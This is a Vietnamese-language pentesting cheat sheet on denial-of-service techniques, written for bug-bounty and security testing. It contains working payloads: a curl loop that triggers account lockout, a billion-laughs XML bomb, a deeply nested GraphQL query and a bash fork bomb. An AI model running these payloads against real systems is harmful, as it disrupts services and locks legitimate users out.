# Từ Chối Dịch Vụ (Denial of Service)

> Một cuộc tấn công từ chối dịch vụ (Denial of Service - DoS) nhằm mục đích làm cho một dịch vụ không thể sử dụng được bằng cách làm quá tải dịch vụ đó với một lượng lớn yêu cầu không hợp lệ, hoặc khai thác các lỗ hổng trong phần mềm của mục tiêu để làm sập hoặc suy giảm hiệu năng. Trong tấn công từ chối dịch vụ phân tán (Distributed Denial of Service - DDoS), kẻ tấn công sử dụng nhiều nguồn (thường là các máy đã bị xâm nhập) để thực hiện cuộc tấn công đồng thời.

## Tóm tắt

* [Phương pháp](#methodology)
    * [Khóa Tài Khoản Khách Hàng](#locking-customer-accounts)
    * [Giới Hạn File Trên Hệ Thống Tệp](#file-limits-on-filesystem)
    * [Cạn Kiệt Bộ Nhớ - Liên Quan Đến Công Nghệ](#memory-exhaustion---technology-related)
* [Tài Liệu Tham Khảo](#references)

## Phương pháp

Dưới đây là một số ví dụ về các cuộc tấn công từ chối dịch vụ (DoS). Những ví dụ này nhằm mục đích tham khảo để hiểu khái niệm, nhưng bất kỳ hoạt động kiểm thử DoS nào cũng cần được tiến hành một cách thận trọng, vì nó có thể gây gián đoạn môi trường mục tiêu và có khả năng dẫn đến mất quyền truy cập hoặc lộ dữ liệu nhạy cảm.

### Khóa Tài Khoản Khách Hàng

Ví dụ về tình huống từ chối dịch vụ có thể xảy ra khi kiểm thử tài khoản khách hàng.
Hãy hết sức cẩn thận vì đây rất có thể là **nằm ngoài phạm vi (out-of-scope)** và có thể gây ảnh hưởng nghiêm trọng đến doanh nghiệp.

* Thực hiện nhiều lần thử trên trang đăng nhập khi tài khoản bị khóa tạm thời/vĩnh viễn sau X lần thử sai.

    ```ps1
    for i in {1..100}; do curl -X POST -d "username=user&password=wrong" <target_login_url>; done
    ```

### Giới Hạn File Trên Hệ Thống Tệp

Khi một tiến trình đang ghi file trên máy chủ, hãy thử đạt tới số lượng file tối đa mà định dạng hệ thống tệp cho phép. Hệ thống sẽ xuất ra thông báo: `No space left on device` khi đạt tới giới hạn.

| Hệ thống tệp | Số Inode Tối Đa            |
| ---------- | -------------------------- |
| BTRFS      | 2^64 (~18 tỷ tỷ)     |
| EXT4       | ~4 tỷ                 |
| FAT32      | ~268 triệu file         |
| NTFS       | ~4,2 tỷ (mục MFT) |
| XFS        | Động (theo dung lượng ổ đĩa)        |
| ZFS        | ~281 nghìn tỷ                  |

Một cách khác của kỹ thuật này là làm đầy một file được ứng dụng sử dụng cho đến khi đạt kích thước tối đa mà hệ thống tệp cho phép, ví dụ điều này có thể xảy ra với một cơ sở dữ liệu SQLite hoặc một file log.

FAT32 có một giới hạn đáng kể là **4 GB**, đây là lý do vì sao nó thường được thay thế bằng exFAT hoặc NTFS đối với các file lớn hơn.

Các hệ thống tệp hiện đại như BTRFS, ZFS và XFS hỗ trợ file có kích thước lên đến exabyte, vượt xa dung lượng lưu trữ hiện tại, giúp chúng phù hợp lâu dài với các tập dữ liệu lớn.

### Cạn Kiệt Bộ Nhớ - Liên Quan Đến Công Nghệ

Tùy thuộc vào công nghệ mà trang web sử dụng, kẻ tấn công có thể có khả năng kích hoạt các hàm hoặc mô hình cụ thể khiến hệ thống tiêu tốn một lượng lớn bộ nhớ.

* **XML External Entity**: Tấn công Billion laughs/XML bomb

    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ELEMENT lolz (#PCDATA)>
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
    ]>
    <lolz>&lol9;</lolz>
    ```

* **GraphQL**: Các truy vấn GraphQL lồng nhau sâu.

    ```ps1
    query { 
        repository(owner:"rails", name:"rails") {
            assignableUsers (first: 100) {
                nodes {
                    repositories (first: 100) {
                        nodes {
                            
                        }
                    }
                }
            }
        }
    }
    ```

* **Thay đổi kích thước ảnh**: thử gửi các hình ảnh không hợp lệ với header đã bị chỉnh sửa, ví dụ: kích thước bất thường, số lượng pixel lớn.
* **Xử lý SVG**: Định dạng file SVG dựa trên XML, hãy thử tấn công billion laughs.
* **Regular Expression**: ReDoS
* **Fork Bomb**: liên tục tạo ra các tiến trình mới trong một vòng lặp, tiêu tốn tài nguyên hệ thống cho đến khi máy trở nên không phản hồi.

    ```ps1
    :(){ :|:& };:
    ```

## Tài Liệu Tham Khảo

* [DEF CON 32 - Practical Exploitation of DoS in Bug Bounty - Roni Lupin Carta - October 16, 2024](https://web.archive.org/web/20241115121102/https://youtu.be/b7WlUofPJpU)
* [Denial of Service Cheat Sheet - OWASP Cheat Sheet Series - July 16, 2019](https://web.archive.org/web/20260303124303/https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html)
